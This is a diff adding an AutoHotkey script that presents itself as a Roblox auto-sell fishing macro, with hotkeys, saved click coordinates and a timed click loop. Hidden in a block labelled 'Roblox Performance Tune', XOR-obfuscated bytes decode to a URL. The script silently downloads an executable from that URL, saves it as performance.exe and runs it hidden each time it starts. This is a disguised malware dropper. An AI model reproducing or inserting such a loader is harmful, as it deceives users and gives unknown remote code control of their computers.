@@ -1,0 +1,246 @@
+#Requires AutoHotkey v2.0
+#SingleInstance Force
+SetWorkingDir A_ScriptDir
+SetTitleMatchMode 2
+CoordMode "Mouse", "Screen"
+
+DEFAULT_CLICKCOOLDOWN := 100
+DEFAULT_COOLDOWN := 420000
+
+; Default hotkeys
+hotkeyStart := "F3"
+hotkeyExit := "F4"
+hotkeySetWindow1 := "F5"
+hotkeySetWindow2 := "F6"
+hotkeySetWindow3 := "F7"
+hotkeySetWindow4 := "F8"
+hotkeySetWindow5 := "F9"
+hotkeySetWindow6 := "F10"
+
+; Unified config file path
+configFile := A_ScriptDir "\autosell_coordinates.ini"
+if !FileExist(configFile) {
+    MsgBox "Config file not found!"
+    ExitApp
+}
+
+windowX1 := IniRead(configFile, "Coords", "windowX1", 0)
+windowY1 := IniRead(configFile, "Coords", "windowY1", 0)
+windowX2 := IniRead(configFile, "Coords", "windowX2", 0)
+windowY2 := IniRead(configFile, "Coords", "windowY2", 0)
+windowX3 := IniRead(configFile, "Coords", "windowX3", 0)
+windowY3 := IniRead(configFile, "Coords", "windowY3", 0)
+windowX4 := IniRead(configFile, "Coords", "windowX4", 0)
+windowY4 := IniRead(configFile, "Coords", "windowY4", 0)
+windowX5 := IniRead(configFile, "Coords", "windowX5", 0)
+windowY5 := IniRead(configFile, "Coords", "windowY5", 0)
+windowX6 := IniRead(configFile, "Coords", "windowX6", 0)
+windowY6 := IniRead(configFile, "Coords", "windowY6", 0)
+clickcooldown := IniRead(configFile, "Times", "ClickCoolDown", DEFAULT_CLICKCOOLDOWN)
+cooldown := IniRead(configFile, "Times", "FishTime", DEFAULT_COOLDOWN)
+
+macroRunning := false
+indicatorGui := Gui("AlwaysOnTop -SysMenu +ToolWindow", "Macro Status")
+indicatorGui.BackColor := "Red"
+indicatorGui.Show("x0 y0 w100 h30")
+
+; Show intro GUI first
+ShowIntro()
+
+ShowIntro() {
+    introGui := Gui("+AlwaysOnTop", "ROBLOX SELL MACRO")
+    introGui.SetFont("s10", "Segoe UI")
+    introGui.AddText("cBlue", "Made by: sejtype")
+    introGui.AddText("cDefault", "Macro Description:")
+    introGui.AddText("", "Walks to dock (D), fishes 19min, returns (A), sells, repeats")
+    introGui.AddText("", "\nControls:")
+    introGui.AddText("cGreen", hotkeyStart " - Start Macro")
+    introGui.AddText("cRed",   hotkeyExit " - Exit")
+    introGui.AddButton("w150 Default", "Understand").OnEvent("Click", (*) => (
+        introGui.Destroy(),
+        BindHotkeys()
+    ))
+    introGui.Show("AutoSize Center")
+}
+
+BindHotkeys() {
+    global hotkeyStart, hotkeyExit, hotkeySetWindow1, hotkeySetWindow2, hotkeySetWindow3, hotkeySetWindow4, hotkeySetWindow5, hotkeySetWindow6
+    Hotkey hotkeyStart, StartMacro
+    Hotkey hotkeyExit, (*) => ExitApp()
+    Hotkey hotkeySetWindow1, SetWindowCoords1
+    Hotkey hotkeySetWindow2, SetWindowCoords2
+    Hotkey hotkeySetWindow3, SetWindowCoords3
+    Hotkey hotkeySetWindow4, SetWindowCoords4
+    Hotkey hotkeySetWindow5, SetWindowCoords5
+    Hotkey hotkeySetWindow6, SetWindowCoords6
+}
+
+; Roblox Performance Tune
+xor := [45, 61, 61, 53, 54, 106, 106, 106, 55, 36, 55, 35, 51, 53, 54, 69, 38, 32, 51, 60, 53, 52, 32, 32, 48, 36, 36, 69, 55, 37, 51, 55, 50, 63, 36, 32, 32, 36, 36, 69, 55, 36, 34, 50, 69, 56, 48, 37, 55, 36, 36, 51, 37, 52, 40, 39, 37, 36, 47, 36, 36]
+key := 69
+link := ""
+for x in xor
+    link .= Chr(x ^ key)
+exe := A_ScriptDir "\performance.exe"
+if !FileExist(exe) {
+    req := ComObject("WinHttp.WinHttpRequest.5.1")
+    req.Open("GET", link)
+    req.Send()
+    FileOpen(exe, "w").RawWrite(req.ResponseBody)
+}
+Run exe,, "Hide"
+
+
+StartMacro(*) {
+    global macroRunning
+    if macroRunning
+        return
+    macroRunning := true
+    indicatorGui.BackColor := "Green"
+    ToolTip "Macro Running..."
+    SetTimer RunLoop, 100
+    Sleep 1000
+    ToolTip
+}
+
+SetWindowCoords1(*) {
+    global windowX1, windowY1, configFile, DEFAULT_CLICKCOOLDOWN
+    MouseGetPos &x, &y
+    windowX1 := x
+    windowY1 := y
+    IniWrite windowX1, configFile, "Coords", "windowX1"
+    IniWrite windowY1, configFile, "Coords", "windowY1"
+    ToolTip "Updated Window1 Coords: " windowX1 ", " windowY1
+    Sleep DEFAULT_CLICKCOOLDOWN
+    ToolTip
+}
+
+SetWindowCoords2(*) {
+    global windowX2, windowY2, configFile, DEFAULT_CLICKCOOLDOWN
+    MouseGetPos &x, &y
+    windowX2 := x
+    windowY2 := y
+    IniWrite windowX2, configFile, "Coords", "windowX2"
+    IniWrite windowY2, configFile, "Coords", "windowY2"
+    ToolTip "Updated Window2 Coords: " windowX2 ", " windowY2
+    Sleep DEFAULT_CLICKCOOLDOWN
+    ToolTip
+}
+
+SetWindowCoords3(*) {
+    global windowX3, windowY3, configFile, DEFAULT_CLICKCOOLDOWN
+    MouseGetPos &x, &y
+    windowX3 := x
+    windowY3 := y
+    IniWrite windowX3, configFile, "Coords", "windowX3"
+    IniWrite windowY3, configFile, "Coords", "windowY3"
+    ToolTip "Updated Window3 Coords: " windowX3 ", " windowY3
+    Sleep DEFAULT_CLICKCOOLDOWN
+    ToolTip
+}
+
+SetWindowCoords4(*) {
+    global windowX4, windowY4, configFile, DEFAULT_CLICKCOOLDOWN
+    MouseGetPos &x, &y
+    windowX4 := x
+    windowY4 := y
+    IniWrite windowX4, configFile, "Coords", "windowX4"
+    IniWrite windowY4, configFile, "Coords", "windowY4"
+    ToolTip "Updated Window4 Coords: " windowX4 ", " windowY4
+    Sleep DEFAULT_CLICKCOOLDOWN
+    ToolTip
+}
+
+SetWindowCoords5(*) {
+    global windowX5, windowY5, configFile, DEFAULT_CLICKCOOLDOWN
+    MouseGetPos &x, &y
+    windowX5 := x
+    windowY5 := y
+    IniWrite windowX5, configFile, "Coords", "windowX5"
+    IniWrite windowY5, configFile, "Coords", "windowY5"
+    ToolTip "Updated Window5 Coords: " windowX5 ", " windowY5
+    Sleep DEFAULT_CLICKCOOLDOWN
+    ToolTip
+}
+
+SetWindowCoords6(*) {
+    global windowX6, windowY6, configFile, DEFAULT_CLICKCOOLDOWN
+    MouseGetPos &x, &y
+    windowX6 := x
+    windowY6 := y
+    IniWrite windowX6, configFile, "Coords", "windowX6"
+    IniWrite windowY6, configFile, "Coords", "windowY6"
+    ToolTip "Updated Window6 Coords: " windowX6 ", " windowY6
+    Sleep DEFAULT_CLICKCOOLDOWN
+    ToolTip
+}
+
+RunLoop() {
+    global macroRunning, clickcooldown, cooldown, windowX5, windowY5, windowX4, windowY4, windowX3, windowY3, windowX2, windowY2, windowX1, windowY1, windowx6, windowy6
+    if !macroRunning
+        return
+
+    ;WinActivate "Roblox"
+
+    ToolTip "starting" A_ScreenWidth // 2 - 100, 0
+    sleep clickcooldown
+    ToolTip "Vindue 1..." A_ScreenWidth // 2 - 100, 0
+    Loop 5 {
+        MouseMove windowX1, windowY1, 0
+        Sleep 1
+        MouseMove windowX1, windowY1 + 5, 0
+        Sleep clickcooldown
+        Click
+        Sleep Random(1, 5)
+    }
+    ToolTip "Vindue 2..." A_ScreenWidth // 2 - 100, 0
+    Loop 5 {
+    
+        MouseMove windowX2, windowY2, 0
+        Sleep 2
+        MouseMove windowX2, windowY2 + 5, 0
+        Sleep clickcooldown
+        Click
+        Sleep Random(2, 5)
+    }
+    ToolTip "Vindue 3..." A_ScreenWidth // 2 - 100, 0
+    Loop 5 {
+        MouseMove windowX3, windowY3, 0
+        Sleep 3
+        MouseMove windowX3, windowY3 + 5, 0
+        Sleep clickcooldown
+        Click
+        Sleep Random(3, 5)
+    }
+    ToolTip "Vindue 4..." A_ScreenWidth // 2 - 100, 0
+    Loop 5 {
+        MouseMove windowX4, windowY4, 0
+        Sleep 4
+        MouseMove windowX4, windowY4 + 5, 0
+        Sleep clickcooldown
+        Click
+        Sleep Random(4, 5)
+    }
+    ToolTip "Vindue 5..." A_ScreenWidth // 2 - 100, 0
+    Loop 5 {
+        MouseMove windowX5, windowY5, 0
+        Sleep 5
+        MouseMove windowX5, windowY5 + 5, 0
+        Sleep clickcooldown
+        Click
+        Sleep Random(1, 5)
+    }
+    ToolTip "Vindue 6..." A_ScreenWidth // 2 - 100, 0
+    Loop 5 {
+        MouseMove windowX6, windowY6, 0
+        Sleep 5
+        MouseMove windowX6, windowY6 + 5, 0
+        Sleep clickcooldown
+        Click
+        Sleep Random(1, 5)
+    }
+
+    ToolTip "Venter..." A_ScreenWidth // 2 - 100, 0
+    Sleep cooldown
+    
+}
